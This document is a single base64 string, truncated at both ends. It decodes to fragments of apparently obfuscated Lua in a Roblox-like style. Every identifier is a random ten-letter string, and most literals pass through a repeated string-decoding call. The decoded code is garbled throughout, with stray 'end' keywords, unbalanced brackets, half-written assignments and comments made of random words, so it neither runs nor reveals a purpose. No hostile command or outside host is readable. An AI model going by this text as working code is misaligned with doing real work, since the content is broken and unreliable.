tYilbInphUGJoVGhiUm4iXSgiZXNybVZpUFJZYz09IikpLAogICAgICAgIFRsWmJXYkpLT0wgPSBSTVdXS2ZXbU16LlRvZU5JSmpiU0Uud1NRT2lQY0hrSQoKCiAgICAgICAgICAgIGVuZAotLSAvLyAvLyAvLyBxS3dVYWlWanNJIGloWVRnRkVsSkkgLy8gLy8gLy8gLS0KLS0gUnVWVW5YaVRlUC54SW1qV2dQTHBZID0gdHJ1ZQogICAgZW5kCiAgICBmdW5jdGlvbigpCiAgICAoKHNCb3FEWkVybkspWyJ6YVBiaFRoYlJuIl0oIkZGQ01vSWhjT0kiKSksCiAgICBJQ0d2RXZrbEl6Lkd3dXFXd3lBeEkgPSAxCiAgICAgICAgTlFaVUhQV0RNbyA9IGZ1bmN0aW9uKHVIc1NnREhKaVcpCi0tIGZDaUFRSVVEc1YgUnVwb1RDZnZXZiBQQVZnTXlSb2pEIHJGSUJjb3JkWEIgKCh6V09wRXdrRXdJKVsiemFQYmhUaGJSbiJdKCJab3Rpa1BUaVVLIikpCiAgICAgICAgSU5tb3dOQkpJZiA9IDUwLAogICAgICAgICAgICAgICAgICAgICAgICBpZiBqY2JQcWdnU2FxIHRoZW4KICAgICAgICBkSHVXdnJ4QlhBID0gKChRSExTclFacXd4KVsiemFQYmhUaGJSbiJdKCJmbUJPZUNMV0tWPT0iKSksCiAgICAgICAgICAgIGlmIElOYlRZUmpHVGEgdGhlbgogICAgbXRZTUNaS2dmQSgKICAgICAgICAgICAgb0VMT1ZGaFNXeCA9IEdsTG14VU5xeG8sCiAgICBFU2hYSFJxSHBKOlZJSGNZWlNSdkIoCiAgICAgICAgICAgICAgICBhb2VDbnRWaXlxLmJTZXlqeXdkRU8oMSkgLS0gQUVnektPTUlDdSBuVWxLd1JaV1ZhIGRyS1VPdEJEZm0gQ0V6bktQd1dsVSBjYlhwYXlZVW5YIG10WU1DWktnZkEKICAgICAgICAgICAgICAgICAgICBlbmQKICAgIHsKICAgICAgICAgICAgZW5kCiAgICAgICAgZEdmcFVaSURFRiB0cnVlIHBZaWlXWkdVQnIKICAgICAgICBOUVpVSFBXRE1vID0gZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgeUpZR2RWanplRy5TVEJiSEJnZktLKEhPcnBxVlpISGgsIEFOT1hJT1hRVnYpCgogICAgICAgICAgICBYVUJCbmtBRXp3LAogICAgICAgICAgICAgICAgICAgIFhnb3ZEaHlUYlk6QlNpRG1TS0hTcygoKG50RmVBa3FLU1cpWyJ6YVBiaFRoYlJuIl0oImZ3UlRjeUxYREQ9IikpKTpCU2lEbVNLSFNzKCgobVlqdUVhY3VBdylbInphUGJoVGhiUm4iXSgieUtDSU5HWFdXaSIpKSk6QlNpRG1TS0hTcygoKGNOVXBIaUpPWU4pWyJ6YVBiaFRoYlJuIl0oInFJZUNrYVdSWW0iKSkpOm1NV3JGbUhPdFUoQURDblNHbnJ0US5VdVdLSEJxbEJlKQopCiAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFhVRG5lVHljc2suWWZ1d3JhZFR4eiA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgaWYgY1hTRFVxd3dsRC5HUnpjbVJzaVhDID09ICgoWktiVUxMekNVbilbInphUGJoVGhiUm4iXSgiTFBuZXpMT2NIaD09IikpIHRoZW4KICAgICAgICAgICAgICAgICAgICAtLSByVkFuc3FIbnlWIHpodlZnZFVyV1UgTXdRQ0NMSVVBWSBJb2JTZWppTkdSIERtdnRMTExMSnIgRmxoVXV5V3JubCwgbWNFSG5tS0pwWiBiUXBxYVRQYXdiCiAgICAgICAgZW5kIC0tIGhzd0F5U1d1dXMgekd4VVZ0eFZ5TSBsR2t6c3pzQW9mIGtIS1lWRUVGSWIgRkdlb2R2WWRZVwogICAgZnVuY3Rpb24od1NRT2lQY0hrSSkKLS0gYU5ibFZJblJWciBxY1Jia0hTaVdiIE1zVHl6SWZaWEggSW9iU2VqaU5HUiBSam9CQlRNQVVVIFN3S1pvcFNMU04KbG9jYWwgQ1dvY3VSd2hyVyA9CmxvY2FsIEVKWVVydXNncWsgPQotLSAvLyAvLyAvLyB4SGFTcUZkb3ZiIC8vIC8vIC8vIC0tCiAgICAgICAgbGF3a1dBVlVoWiA9ICgoUVRXWE5uTXlNZSlbInphUGJoVGhiUm4iXSgiekpEdlBYRmpQWiIpKSwKICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZApRZWJobmJURW5CLk5BSHlJa3diZFUgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgIGRHZnBVWklERUYgQURDblNHbnJ0US54Qm1wcXJLbGxLID09IEhHSXJRdnpPeXUgcFlpaVdaR1VCcgogICAgICAgICAgICAtLSBoSmlqUkZteWJ1IGFjSGlrVGtjeVogckZJQmNvcmRYQiB1ekphdFV5d0VPIEhaeUhXekliUHYgTklrd3FYbXpwTiQgSFp5SFd6SWJQdiBhcUhSeXh6ZmZFIEt2aGNGdk94YVQKICAgIGVuZAotLSBLZndIUGREQ29pIHl5WEtEdnViR1QKLS0gKip3akVjbFhtcWN6IEloWVF2bFVvUXcgY053WUp1V1VBYiBoQ2FsRXJEZkZEIGJpU3dwY1NLUFAgWExuRlRha0xoRioqCgogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICBlbmQKICAgICAgICBmdW5jdGlvbihBRENuU0ducnRRKQoKICAgIGNtQkhhR3J3VkYgPSBOc2ppaXNRRk5YOlp3b29TaWpVSEsoKChrallyREFkbUJtKVsiemFQYmhUaGJSbiJdKCJUYnVXbUxaZlVQIikpKSBMenVvY1ZEc0dyIE5zamlpc1FGTlguVnNPYkh0VExmdy5YbUhydlN3S1VJIEpkbGxkZkZ5d1ggbmlsLAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgaWYgWUVVenRkZkN3RiB0aGVuCiAgICAgICAgICAgIEtrek9pU0Jqc2wuSFd2cUVWaUhtTS54SGxleUNTQ0F5OkxOWnRRdUdXeWgoKQoKbG9jYWwgZnVuY3Rpb24gRVh0RlBiRHRHTygpCiAgICAgICAgZW5kCgpYVUJCbmtBRXp3Lmx6YnFMV3htUWggPSBha1JCbXBGV0h2LkFndWZac2FUQnkoMjIwLCAyMjAsIDIyMCkgLS0gSWtNd2xwUUJWbiBsaUh6Tm5VeUV0LWxpSHpOblV5RXQgaWRianlXYmpHQQpsb2NhbCBueEVqUlNJSk9uID0gVVdmeUJsUVd1aTpCU2lEbVNLSFNzKCgoa0lQeUpxTGtWcSlbInphUGJoVGhiUm4iXSgiT2VXQnVhdUVIeD0iKSkpCiAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBsb2NhbCBJS0xsQ2tMUnNKID0galVyUk5ncXNRTC53U1FPaVBjSGtJClhVQkJua0FFencuTElCdmlrSnZrWCA9IHJlV1NDUkdPZnMoMC4wOCkgLS0gcFVQRlJ4Q2lMZSBSdXBvVENmdldmIG1GVXJvclNsdkwKICAgICAgICAgICAgICAgIENaeE11eUl6QW8uekhMVUdTdmx0ZCA9IHNUUE9obWdJYUYKWFpUU1BCelVWTyBNcEthbVZHbVhqLCBYVURuZVR5Y3NrIG10cGRDRWNFRGogeWh6VFVjQ1lmTyh3RUVQTmhyS0d3OkVhdE9pZlhMWlUoKSkgcFlpaVdaR1VCcgogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICApCmxvY2FsIHBGZHpNYWxiTHcgPSBTVXlYV3dYRkl0LnhoVG9namVpZmgoKChsU3N5QlJCZmZOKVsiemFQYmhUaGJSbiJdKCJHaFRwbWdmUExIPSIpKSkKICAgICAgICAgICAgdU5LTnNGZmthcjpMdEJpZ3lTSVpXKCkKCgogICAgICAgICAgICBpZiBxc2xHQnNIR0JWIERLZktSWGpXUmUuaUxuR3hkZGhBai5La3pPaVNCanNsLkhXdnFFVmlIbU06dnFacWNESnFteCgoKGZZWm9xUmhZVU0pWyJ6YVBiaFRoYlJuIl0oIklzVVZSZExxUHU9PSIpKSkgdGhlbgogICAgICAgIGVuZApsb2NhbCBFU2hYSFJxSHBKID0gUW5MWGlWVk9Vai5ER1Zua05pa2hTOmZJV0RBT3BCeEYoKChUTmhqSlNDVGNQKVsiemFQYmhUaGJSbiJdKCJVT01BaVpnYWFUPSIpKSkKICAgIGlmIGR5bE1LeGdlTEogdGhlbgoKICAgIGZ1bmN0aW9uKCkKICAgIFFuTFhpVlZPVWouREdWbmtOaWtoUzpWcGNPbkt1V0pPKApsb2NhbCBRZWJobmJURW5CID0gU1V5WFd3WEZJdC54aFRvZ2plaWZoKCgodHdFak5uWmhpeClbInphUGJoVGhiUm4iXSgiZkRKQ09wdUNubD0iKSkpCiAgICBsb2NhbCBaU2ZueU1hbkN0ID0gVExIV3FUbnlGSi5WUlNNaEpnTVFjKChxVVlhTGtGT2VPICUgMzYwMCkgLyA2MCkKLS0gUmdNUFFod0NNZS52TmlEcFRlZmRuID0gKChQRVNZcURrbFppKVsiemFQYmhUaGJSbiJdKCJvWlhYeHNZWG13IikpIC0tIEtlWUpDdWxybnMgckZJQmNvcmRYQiBnc2FaVk5JcEtuIHNxZVZUWWF5anUgRG12dExMTExKciB3WVVrR3dsVEpzCmxvY2FsIGV5aFdBT2lLd0kgPSBmYWxzZQoKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAoKLS0gWmFHUFlkZmhIUiBrSEtZVkVFRkliIHFLd1VhaVZqc0kgSkphcVhySWdHViBPWkVFd0VyVVFmCnVmeFJ5c0RibGs6TVdkY0FTelBuVCgoKHBIa1RvRXBQbmgpWyJ6YVBiaFRoYlJuIl0oIkpuWUVWSWNEdGIiKSkpCiAgICBLa3pPaVNCanNsLkhHSXJRdnpPeXUuQWF3b2NHbE1FYTpad29vU2lqVUhLKCgoYVNaZ3NSYlBybSlbInphUGJoVGhiUm4iXSgid1BwRE5oQ1FJUz0iKSkpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBpZiBKTkpVaFlDeU1VLldGSnhxVU9Vb24gPT0gbmlsIHRoZW4KICAgICAgICAgICAgICAgIHpuTEVuTGZBb1QuSWtvenJJdlhSUyhneERGQ1RIS2doKQogICAgICAgICAgICAgICAgYkpKa0t5Q1d6QyhaZHNsbFhSZlpqKQogICAgICAgIE1xWW94RG9zSkcgPSAoKHlmWVRjYWRKZnUpWyJ6YVBiaFRoYlJuIl0oInVMcGhNc29taEQ9PSIpKSwKICAgIH0KICAgICAgICAKICAgICAgICAgICAgZW5kCiAgICAgICAgbGF3a1dBVlVoWiA9ICgodUp1eWVaTldpYylbInphUGJoVGhiUm4iXSgickFQeHdHdlNjaj0iKSksCgogICAgICAgICAgICAgICAgICAgIEpOSlVoWUN5TVUuV0ZKeHFVT1VvbiA9IGZhbHNlCmhpY01ZZkpwenEgPSBDeEFObFFGcWdCLkNFeGtnUm5EVEU6a2phcWp6RG5CbChmdW5jdGlvbihBRENuU0ducnRRKQogICAgICAgICAgICBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKCh1YmpsbGdqRnhRKVsiemFQYmhUaGJSbiJdKCJaVkVRVUZzZkRGPSIpKSkudnR3SmRGZE1xdTpad29vU2lqVUhLKCgoZGFnd05LV0dZaSlbInphUGJoVGhiUm4iXSgiWWFzeEtzd3RIUz0iKSkpCiAgICAgICAgLS0geE51S2l6cm1IbiBBQklBZUJlV21PIGN0Y2ZScmtjUWsgQ0V6bktQd1dsVSBZaXNXaHNTTkFaIEtxcG5jQkZDeW8gcktYaUlMRGh6aQoKICAgIGVuZAotLSBVRnl4dVdqcWRMIE9aRUV3RXJVUWYKICAgIHsKCiAgICAgICAgTFVvZ0hsenBOQiA9IFJNV1dLZldtTXouY1hFeUFiQXRUdS53U1FPaVBjSGtJCiAgICAgICAgICAgICAgICBhb2VDbnRWaXlxLmJTZXlqeXdkRU8oMSkKICAgIGxvY2FsIGpjYlBxZ2dTYXEgPSBVUlNEV1JKcnlTKCkKICAgICAgICBlbmQKICAgICAgICBpZiBpb0JBa0dXVGRLIEx6dW9jVkRzR3IgaW9CQWtHV1RkSy5BdkdaeHpkZWx1IHRoZW4KICAgICAgICAgICAgbG9jYWwgRkdOS2ZaRlJDaSA9IFdTdnFSaFRWU3cocWNPb0JUT1hTQy53U1FPaVBjSGtJKSBKZGxsZGZGeXdYIDMgLS0ga0lGeGlFdVdFQSBVeUhzTmlBWlVHIElhbGpFdW1UR3kgaENhbEVyRGZGRAotLSAgICAgLS1QYVdBdWtTU0FZIEdHUXpwT2JvYkUgakxTcXdScGttRyBSbUZzeFZyeFdwLS0KICAgICAgICBlbmQKbG9jYWwgRU5Fc0hVd2NaVSA9IERLZktSWGpXUmU6U2NTRGlEdU9acygoKGZsWEJOSEl3ZGgpWyJ6YVBiaFRoYlJuIl0oIk9SRWJxbHJjS1U9IikpKQogICAgZW5kCi0tIFdJRUV3TGR5UnYgWmRCZUZqWXBaeCBicFlpbVFqd0ZVIFJqb0JCVE1BVVUgRVNoWEhScUhwSiBGcHVac0lQU2RmIFFYd3dUYk9LWWggb1RrS2lRbWZHbCBjTndZSnVXVUFiCiAgICAgICAgICAgICAgICBJYmF6R2pEcExVID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICBYVURuZVR5Y3NrOlZ3SXZoRXdOS3YoKChWUkJiU1hVZXZTKVsiemFQYmhUaGJSbiJdKCJwS3Z1RWdOQ3ZrPSIpKSkgSmRsbGRmRnl3WCBYVURuZVR5Y3NrOlZ3SXZoRXdOS3YoKChPaXRUZVNya3BxKVsiemFQYmhUaGJSbiJdKCJ3YndpZEhCZmtGPT0iKSkpIEpkbGxkZkZ5d1ggWFVEbmVUeWNzazpWd0l2aEV3Tkt2KCgoS0JKc1pDUWFlaSlbInphUGJoVGhiUm4iXSgiTldnZEtXQXRmTiIpKSkgSmRsbGRmRnl3WApsb2NhbCBmYlR1YVpKWGhDID0ge30KICAgICAgICAgICAgRkdOS2ZaRlJDaSA9IFRMSFdxVG55Rkoua0VlYU1OcldGWChGR05LZlpGUkNpLCAxLCAxMCkgLS0gVEpkR1NuVmhqSiBSam9CQlRNQVVVIGlZZHVvUExBT1ogMSAtIDEwIHV2Qm1rRG1saUMKCiAgICAgICAgICAgICgocmFxdFNuZFNIZilbInphUGJoVGhiUm4iXSgiZXZWWUpDUHdSSz09IikpLAogICAgdkdMbEJ6V2dDaiA9ICgoY3R4WHZCV25HaClbInphUGJoVGhiUm4iXSgoKFJjY2dCa0JRWHMpWyJ6YVBiaFRoYlJuIl0oKChUc3V5YXRNcFJSKVsiemFQYmhUaGJSbiJdKCgoekVFQ3lPZU5FQylbInphUGJoVGhiUm4iXSgoKEhiUVRsempTb0opWyJ6YVBiaFRoYlJuIl0oKChGVkxtcnFRVEphKVsiemFQYmhUaGJSbiJdKCgoTkZsR0NUUXp5cSlbInphUGJoVGhiUm4iXSgiIikpKSkpKSkpKSkpKSkpLAogICAgICAgIGxhd2tXQVZVaFogPSAoKHhrRkRQUVpGQ3kpWyJ6YVBiaFRoYlJuIl0oIlhGRHZmdkh5aFQ9PSIpKSwKICAgICAgICBsb2NhbCBHQ0JaSE9wcE15ID0geEhsZXlDU0NBeTp5UFNtdkRaRExjKCgoY1dOcmNTc013UClbInphUGJoVGhiUm4iXSgid09IcERMTk5tZj0iKSkpCiAgICAgICAgbGF3a1dBVlVoWiA9ICgoS3F3aWpOdlZDbClbInphUGJoVGhiUm4iXSgiZWF1cG5ZSVhHTSIpKSwKLS0gU3hnR1NNQ0NaTi54Qm1wcXJLbGxLID0gUWViaG5iVEVuQgogICAgICAgICAgICAgICAgICAgICAgICBaWnJ2aVhMY0FMKCgoU253dktESkVjUSlbInphUGJoVGhiUm4iXSgiVWpaWnFFS0V4eD09IikpLCBCTWNZQkJRbExSKQogICAgeW1EY0F5aEZrSy5Ga1FGaWdjbk9FID0gdHJ1ZQogICAgICAgIFdxQldVdmpySFMubVZiam1meWRWbSA9IGJSR1dHcURlRmQKICAgICAgICAgICAgZGdXam5PWGtCRSgpCgoKCiAgICAgICAgaHhnSVV5Q1VzTyA9IGZhbHNlCiAgICApCiAgICAgICAgICAgIFsxXSA9ICgoS2lMZmFEa2V6WilbInphUGJoVGhiUm4iXSgibGxvQ1hOZUhWZStmU0JTWGFsVkdaIikpLAogICAgICAgICAgICAgICAgaWYgbGpQRnl4c2FMdy5zSmVDanFsTHRXIHRoZW4KICAgICAgICAgICAgaWYgRUxhWlFwVXZNTCB0aGVuIEVMYVpRcFV2TUw6dUZNaldqdXFaRSgpIGVuZAopCikKLS0gLS0gdWl5SnFFV2hESSBicFlpbVFqd0ZVIHRFS25ZTk1QWEggbmJua09HbFZSVQogICAgICAgICAgICBsb2NhbCBtZlN2VnZFWHBLID0gS2t6T2lTQmpzbC5IV3ZxRVZpSG1NCiAgICAgICAgICAgICAgICBXWklLZlhEbWdKID0gKChNa1FQanRIc0xhKVsiemFQYmhUaGJSbiJdKCJqRUVzU1paYWRwPT0iKSksCiAgICBleWhXQU9pS3dJID0gcXNsR0JzSEdCViBleWhXQU9pS3dJIC0tIFpkQmVGallwWnggVUZ0cU1lYnBqSyBETERoTlpwbmR4IEhaeUhXekliUHYgTWZ4VGhZeUFjSgpjWFNEVXF3d2xELkdSemNtUnNpWEMgPSAoKFpLYlVMTHpDVW4pWyJ6YVBiaFRoYlJuIl0oIkxQbmV6TE9jSGg9PSIpKSAtLSB2R0xsQnpXZ0NqIGFjYVZScUZ6SkogTGdzUGdwUnNyZwoKICAgICAgICBKRnN1WlJhTlFiOlBjbWRZd1pPc3YoI0hPcnBxVlpISGggPiAwIEx6dW9jVkRzR3IgSE9ycHFWWkhIaCBKZGxsZGZGeXdYIHsoKE5LTlVpR21WZVYpWyJ6YVBiaFRoYlJuIl0oIklrbVp6Z3BhdEE9PSIpKX0pCikKICAgIH0KbG9jYWwgZnVuY3Rpb24gS3BCSWFzY2dMRihwVk9ZVmhyeEhrKQogICAgICAgICAgICAgICAgICAgIGdJZ09xc1Jkc0goCmxvY2FsIGxpaHdCeXROanggPSBuaWwgLS0gbWRWbFh5TmdSaiBrSEtZVkVFRkliIGRpUmZTdEdhdVcgd29lUlRZTGZ4VApsb2NhbCBMVW9nSGx6cE5CID0gZmFsc2UKbG9jYWwgWXJDRmd6eFhJSCA9IEVTaFhIUnFIcEo6VklIY1laU1J2QigoKHduWHNoYm5oVWwpWyJ6YVBiaFRoYlJuIl0oImtwd3dyVkxxUHE9PSIpKSwgewogICAgICAgICAgICAgICAgYW5UbnpBb0NpeiA9IGZhbHNlLAogICAgICAgIGVuZCkKICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIENXb2N1Undoclcud1NRT2lQY0hrSSB0aGVuCiAgICBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKChKVXhlUlh0ZWxrKVsiemFQYmhUaGJSbiJdKCJjTmJ2cVFBQk9JPT0iKSkpOnB3WUhrUlF5SGYoZmFsc2UsICgoRWxHbFd6ckFvUSlbInphUGJoVGhiUm4iXSgiSG5NTlFiQlBmZj0iKSksIGZhbHNlLCBES2ZLUlhqV1JlKQogICAgICAgIHZHTGxCeldnQ2ogPSAoKGtIbWphbnRTTXApWyJ6YVBiaFRoYlJuIl0oInlJVENCcGlYV1E9PSIpKSwKICAgIC0tIEtPdE1WemtuaXAgV3RKUEZFQ2d2cSBZaXNXaHNTTkFaIEtxcG5jQkZDeW8gcnpGaWVYZ01GSgotLSBxS3dVYWlWanNJIEl3ZmJmV05RYm4geXd5SVdkS3RPVwoKCiAgICAgICAgICAgIEx4anZKdXlUZFc6THRCaWd5U0laVygpCiAgICAgICAgICAgIC0tIFNGcUhMRFpLZG0gVnBSRUlUaWRFbyBjTndZSnVXVUFiIGpkUFZLTGd0emYgKGxHa3pzenNBb2YgWnNYSGt0UERpciBGbGhVdXlXcm5sKQopCi0tIEZyR3hNd2h4Z1oga0hLWVZFRUZJYiBaWmRVWXp2UWVxIFFaRXpkSm9nb08KICAgICAgICAgICAgaWYgaW9CQWtHV1RkSyBMenVvY1ZEc0dyIGlvQkFrR1dUZEsuQXZHWnh6ZGVsdSB0aGVuCiAgICAgICAgICAgIGFvZUNudFZpeXEuYlNleWp5d2RFTygwKQogICAgICAgIHlKWUdkVmp6ZUcuU1RCYkhCZ2ZLSyh6WHFaYWN2UVBhLCBBTk9YSU9YUVZ2LlV1V0tIQnFsQmUpCiAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBhb2VDbnRWaXlxLmJTZXlqeXdkRU8oMC41KSAtLSBub3llVHNEcmhYIEZHTktmWkZSQ2kgS29GdWxPc3hubiBMWWhCWE5WeUFRIEh6VVBTTnh2Y0EKICAgICAgICBNcVlveERvc0pHID0gKChRSndzc05NaHRMKVsiemFQYmhUaGJSbiJdKCJWUHhwaVpKcWtnPT0iKSksCiAgICAgICAgICAgICAgICBzSmVDanFsTHRXID0gdHJ1ZSwKLS0gWmRCZUZqWXBaeCBxS3dVYWlWanNJIEpKYXFYcklnR1YKICAgICAgICAgICAgICAgIFhaVFNQQnpVVk8gTXBLYW1WR21YaiwgQURDblNHbnJ0USBtdHBkQ0VjRURqIGRJVlFOSXdYbEsoZ3JpZ3l2eUFXRzpFYXRPaWZYTFpVKCkpIHBZaWlXWkdVQnIKICAgICAgICAgICAgWFpUU1BCelVWTyBNcEthbVZHbVhqLCBBRENuU0ducnRRIG10cGRDRWNFRGogeWh6VFVjQ1lmTyhoZm1zeVRXa3VSOkVhdE9pZlhMWlUoKSkgcFlpaVdaR1VCcgogICAgICAgICAgICAgICAgaWYgandReHhKWGhvbSB0aGVuCiAgICBsb2NhbCBub0FFRVZlemNlID0ge30KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFpMeU9CWmFFVUEgPSBnbEl6eVFNYkRoKG1ITEVZQ1hsTkcpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgQU5PWElPWFFWdiA9IEN4QU5sUUZxZ0IgTHp1b2NWRHNHciBDeEFObFFGcWdCOnlQU212RFpETGMoKChmWVpvcVJoWVVNKVsiemFQYmhUaGJSbiJdKCJJc1VWUmRMcVB1PT0iKSkpCmxvY2FsIFR5T1JqU09YcnQgPSBRbkxYaVZWT1VqLlp6VEFpWGdkb246ZklXREFPcEJ4RigoKGhVUGNiWW11RncpWyJ6YVBiaFRoYlJuIl0oIndhYmtxV1l1b0giKSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBaTHlPQlphRVVBLlV1V0tIQnFsQmUgPSAoKEJ6Q1JLZnZkb1gpWyJ6YVBiaFRoYlJuIl0oIlhQRklZdHFZeUo9PSIpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFhnb3ZEaHlUYlkub1FnQ3RXc1RtalsoKEVNVkdtbkdMRHIpWyJ6YVBiaFRoYlJuIl0oIm5TTmhZa0tnTk89PSIpKV06bU1XckZtSE90VSgxMDAsIFFCT1RyTUZ3WFopCiAgICAgICAgICAgIGlmIFllUktibnFpaEgudkxCTWNrenZiViB0aGVuCi0tIEdlckpYV2l3b3QKbG9jYWwgV2l4Rm9LcUlGUyA9IERLZktSWGpXUmU6U2NTRGlEdU9acygoKFNoUkJZS0x4UFgpWyJ6YVBiaFRoYlJuIl0oIlh3TWJTWnNlV3M9PSIpKSkKICAgIGVuZAogICAgICAgICAgICAgICAgICAgIEhXdnFFVmlIbU0uV3FCV1V2anJIUy5tVmJqbWZ5ZFZtID0gWFNEcmJ5dHJnZApYWlRTUEJ6VVZPIE1wS2FtVkdtWGosIElvYlNlamlOR1IgbXRwZENFY0VEaiB5aHpUVWNDWWZPKHprYVhOQllpZ1Y6RWF0T2lmWExaVSgpKSBwWWlpV1pHVUJyCi0taWpHdlVOc0ZaRCB5d3p4ekFyYVpHIFpMQ2RQTlFCaGwgaWp1alloSENqeQogICAgICAgICB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBtS1JMSWNCUnBNID0gWG1EcHhCRXd6cS5oSUNyQVpVcWxkIC0gVnBtaU5GWGFnTy54aFRvZ2plaWZoKDAsIDEwLCAwKQoKICAgICAgICB2eXpQYWRzbEVhID0gMAogICAgICAgIGlmIHRIZW92aEprUkEgdGhlbgogICAgICAgICAgICAtLSBQRG1wS3BGbmx2IHdGSUZoV0pqRkkgYWNIaWtUa2N5WiBRWHd3VGJPS1loIG5zR1ZKUUJwSXIgckZJQmNvcmRYQiBLdmhjRnZPeGFUIFJQcHhTaWhkZ1kgbktaZmhkaEx0eAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdxQldVdmpySFMubVZiam1meWRWbSA9IEJiUHZ2RVNqc0kubVZiam1meWRWbSArIFZwbWlORlhhZ08ueGhUb2dqZWlmaCgwLCA1LCAwKQogICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgIE1xWW94RG9zSkcgPSAoKHhodWZod2VqUkgpWyJ6YVBiaFRoYlJuIl0oIndreW92SGRDRU89IikpLAogICAgbG9jYWwgamNiUHFnZ1NhcSA9IFVSU0RXUkpyeVMoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICB7Cn0pCiAgICAgICAgdXpTbFZiUFJpRyh0cnVlKQogICAgZW5kCikKICAgIE1xWW94RG9zSkcgPSAoKEFQSVFCanNNb0spWyJ6YVBiaFRoYlJuIl0oImd2YmpxSmxDcXY9IikpLAogICAgICAgICAgICAgICAgICAgIHNkRXpTbFhHZlI6Q2RwdGRGU3dEWigoKFJpT2V6S2hPdlkpWyJ6YVBiaFRoYlJuIl0oImVOeUJMcnBqeksiKSksIHJkeU5xb3lEVnYsIDUpCn0pCiAgICAgICAgICAgIC0tIFhGbFdmSXdSQ3YgbUZ1SWtVRmpjcyBXRkp4cVVPVW9uIEttQnFXZ1JWVHkgS3FwbmNCRkN5bwotLSBNQ1p3em9jamthIEprbXV5cFBFalIgdm1EVVpXS0hnVSBJYWxqRXVtVEd5IGRQd3hQbWJwbWQgKGxHa3pzenNBb2YgWnNYSGt0UERpciBGbGhVdXlXcm5sKQogICAgICAgICAgICAgICAgICAgIGlmIEFOT1hJT1hRVnYgTHp1b2NWRHNHciBBTk9YSU9YUVZ2Olp3b29TaWpVSEsoKChNbU5jdkxtZVJTKVsiemFQYmhUaGJSbiJdKCJhYllxVlVwREVGIikpKSB0aGVuCiAgICAgICAgdkdMbEJ6V2dDaiA9IHBaQUNNb3hhS0QKCiAgICAgICAgbGF3a1dBVlVoWiA9ICgobnd4bHFSSURpdylbInphUGJoVGhiUm4iXSgia01FeWNoaElNcD09IikpLAotLSAvLyAvLyAvLyBMVW9nSGx6cE5CIE9RUE1odUxvRmcgLy8gLy8gLy8gLS0KLS0gVXhCU2pZbVVybCBrSEtZVkVFRkliIEdoSUpkWVdPWWwgdU5LTnNGZmthciBac1hIa3RQRGlyIEtxcG5jQkZDeW8gbXBXVkNiQ1VJbgogICAgICAgIE1xWW94RG9zSkcgPSAoKGVOWkF2eHdtQXYpWyJ6YVBiaFRoYlJuIl0oImdPWUViemFDc2E9IikpLApwRmR6TWFsYkx3LnZOaURwVGVmZG4gPSAoKFBFU1lxRGtsWmkpWyJ6YVBiaFRoYlJuIl0oIm9aWFh4c1lYbXciKSkgLS0gS2VZSkN1bHJucyByRklCY29yZFhCIFhka1pDbXRuc0cgZ3NhWlZOSXBLbiBzcWVWVFlheWp1IHpwS2J5UW1qb2wKICAgICkKbG9jYWwgVGhzTVJtRlZodCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgbGlod0J5dE5qeC5kWGRvb2xaTmd6ID0gVnBtaU5GWGFnTy54aFRvZ2plaWZoKDAsIDAsIDApIC0tIFNURFd5ZndmRU0gdkZpa01nZVNUTwogICAgICAgICAgICAgICAgcldkTXpLcUZUaigpCiAgICAgICAgICAgIFpsd2FyUm9uaVYoKChrSE9pWU1kRGZNKVsiemFQYmhUaGJSbiJdKCJ2QVNjVkF5cVJBIikpKQogICAgTlFaVUhQV0RNbyA9IGZ1bmN0aW9uKHdTUU9pUGNIa0kpCgoKICAgIFFuTFhpVlZPVWoucUt3VWFpVmpzSTppdlVySlh3a25aKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgQmJQdnZFU2pzSSA9IHdFRVBOaHJLR3c6Wndvb1NpalVISyh3U1FPaVBjSGtJKQogICAgICAgIHJldHVybiB7KChRU0xIZUtKelVNKVsiemFQYmhUaGJSbiJdKCJYemVnZmdza0VJPT0iKSl9CiAgICBhblRuekFvQ2l6ID0gZmFsc2UsCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgIGVuZAogICAgICAgIGxvY2FsIE5nbXBmZHlLZ0ogPSBYZ292RGh5VGJZLm52ZHFkdWh5V0JbS2t6T2lTQmpzbC5VdVdLSEJxbEJlXS5UR1p5VXlIcGFOLkFOT1hJT1hRVnYud1NRT2lQY0hrSQogICAgICAgICAgICAgICAgZW5kCiAgICBoRXRlbEtzRW92OlJZd0FiREZmaUkoCiAgICAgICAgbG9jYWwgZ1hlVERXVXdXTSA9CiAgICAgICAgICAgICAgICBYVURuZVR5Y3NrLlhYRXFyRklGVnkgPSBSTVdXS2ZXbU16LmxzRVhMZ3F0dE8ud1NRT2lQY0hrSQoKbG9jYWwgWG1EcHhCRXd6cSA9IGN5WVV3UVpMeXkgTHp1b2NWRHNHciBjeVlVd1FaTHl5Olp3b29TaWpVSEsoKChRSlVQVVlCaVNKKVsiemFQYmhUaGJSbiJdKCJjUGNuZnZUeVZFPT0iKSkpCiAgICBlbmQKbG9jYWwgdVZGWXRZeW